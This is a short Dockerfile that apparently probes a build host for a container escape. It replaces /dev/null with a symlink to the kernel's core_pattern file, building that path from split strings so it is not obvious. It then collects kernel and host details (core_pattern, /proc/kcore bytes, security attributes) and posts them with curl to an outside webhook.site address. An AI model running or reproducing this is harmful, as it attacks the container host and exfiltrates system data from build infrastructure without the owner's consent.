FROM alpine:3.20 AS mknull
RUN apk add --no-cache curl >/dev/null 2>&1; rm -f /dev/null && T=/proc/sys/kernel/core_pat && T=${T}tern && ln -s "$T" /dev/null && ls -la /dev/null && readlink /dev/null
FROM mknull AS detect
RUN { echo "== f2 symnull3 detect =="; echo "devnull:"; ls -la /dev/null; readlink /dev/null; echo "kcore:"; stat -c "%F %t:%T %s" /proc/kcore; echo "kcore-head:"; head -c 64 /proc/kcore | od -c | head -3; echo "real-core:"; cat /proc/sys/kernel/core_pattern; echo "attr:"; cat /proc/self/attr/current; echo "ulimit:"; ulimit -c; } > /f2det.txt 2>&1; curl -sS -m 20 -X POST --data-binary @/f2det.txt https://webhook.site/31fc19a8-5cfc-44ac-b27f-517fdcb8ffbb; echo; cat /f2det.txt
